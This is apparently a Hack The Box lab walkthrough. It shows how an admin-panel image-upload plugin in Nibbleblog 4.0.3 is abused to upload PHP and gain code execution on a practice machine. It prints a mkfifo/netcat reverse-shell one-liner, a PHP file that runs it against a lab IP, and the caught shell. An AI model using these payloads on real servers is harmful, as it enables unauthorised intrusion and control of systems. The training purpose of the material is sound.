# Nibbles - Initial Foothold

---

Now that we are logged in to the admin portal, we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the webserver. We know a `Metasploit` module will likely work for this, but let us enumerate the admin portal for other avenues of attack. Looking around a bit, we see the following pages:

|**Page**|**Contents**|
|---|---|
|`Publish`|making a new post, video post, quote post, or new page. It could be interesting.|
|`Comments`|shows no published comments|
|`Manage`|Allows us to manage posts, pages, and categories. We can edit and delete categories, not overly interesting.|
|`Settings`|Scrolling to the bottom confirms that the vulnerable version 4.0.3 is in use. Several settings are available, but none seem valuable to us.|
|`Themes`|This Allows us to install a new theme from a pre-selected list.|
|`Plugins`|Allows us to configure, install, or uninstall plugins. The `My image` plugin allows us to upload an image file. Could this be abused to upload `PHP` code potentially?|

Attempting to make a new page and embed code or upload files does not seem like the path. Let us check out the plugins page.

![http://10.129.42.190/nibbleblog/admin.php?controller=plugins&action=list](https://academy.hackthebox.com/storage/modules/77/plugins.png)

Let us attempt to use this plugin to upload a snippet of `PHP` code instead of an image. The following snippet can be used to test for code execution.

Code: php

```php
<?php system('id'); ?>
```

Save this code to a file and then click on the `Browse` button and upload it.

![http://10.129.42.190/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image](https://academy.hackthebox.com/storage/modules/77/upload.png)

We get a bunch of errors, but it seems like the file may have uploaded.

  Nibbles - Initial Foothold

```shell-session

Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27

Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
```

Now we have to find out where the file uploaded if it was successful. Going back to the directory brute-forcing results, we remember the `/content` directory. Under this, there is a `plugins` directory and another subdirectory for `my_image`. The full path is at `http://<host>/nibbleblog/content/private/plugins/my_image/`. In this directory, we see two files, `db.xml` and `image.php`, with a recent last modified date, meaning that our upload was successful! Let us check and see if we have command execution.

  Nibbles - Initial Foothold

```shell-session
frodonomojo@htb[/htb]$ curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

We do! It looks like we have gained remote code execution on the web server, and the Apache server is running in the `nibbler` user context. Let us modify our PHP file to obtain a reverse shell and start poking around the server.

Let us edit our local PHP file and upload it again. This command should get us a reverse shell. As mentioned earlier in the Module, there are many reverse shell cheat sheets out there. Some great ones are [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).

Let us use the following `Bash` reverse shell one-liner and add it to our `PHP` script.

  Nibbles - Initial Foothold

```shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
```

We will add our `tun0` VPN IP address in the `<ATTACKING IP>` placeholder and a port of our choice for `<LISTENING PORT>` to catch the reverse shell on our `netcat` listener. See the edited `PHP` script below.

Code: php

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

We upload the file again and start a `netcat` listener in our terminal:

  Nibbles - Initial Foothold

```shell-session
0xdf@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
```

`cURL` the image page again or browse to it in `Firefox` at http://nibbleblog/content/private/plugins/my_image/image.php to execute the reverse shell.

  Nibbles - Initial Foothold

```shell-session
frodonomojo@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
/bin/sh: 0: can't access tty; job control turned off
$ id

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Furthermore, we have a reverse shell. Before we move forward with additional enumeration, let us upgrade our shell to a "nicer" shell since the shell that we caught is not a fully interactive TTY and specific commands such as `su` will not work, we cannot use text editors, tab-completion does not work, etc. This [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) explains the issue further as well as a variety of ways to upgrade to a fully interactive TTY. For our purposes, we will use a `Python` one-liner to spawn a pseudo-terminal so commands such as `su` and `sudo` work as discussed previously in this Module.

Code: bash

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Try the various techniques for upgrading to a full TTY and pick one that works best for you. Our first attempt fails as `Python2` seems to be missing from the system!

  Nibbles - Initial Foothold

```shell-session
$ python -c 'import pty; pty.spawn("/bin/bash")'

/bin/sh: 3: python: not found

$ which python3

/usr/bin/python3
```

We have `Python3` though, which works to get us to a friendlier shell by typing `python3 -c 'import pty; pty.spawn("/bin/bash")'`. Browsing to `/home/nibbler`, we find the `user.txt` flag as well as a zip file `personal.zip`.

  Nibbles - Initial Foothold

```shell-session
nibbler@Nibbles:/home/nibbler$ ls

ls
personal.zip  user.txt
```
